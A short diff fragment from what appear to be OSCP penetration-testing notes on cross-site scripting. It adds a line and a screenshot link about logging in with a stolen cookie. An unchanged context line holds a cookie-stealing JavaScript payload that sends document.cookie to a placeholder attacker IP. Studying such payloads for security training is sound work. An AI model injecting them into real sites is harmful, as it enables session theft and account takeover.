@@ -44,6 +44,10 @@ new Image().src='http://<attacker ip>/?output='+document.cookie;
 // and so on
 ```
 
+using cookie to access 
+
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Pic/XSS/XSS_Login.png)
+
 Phishing
 
 ```js
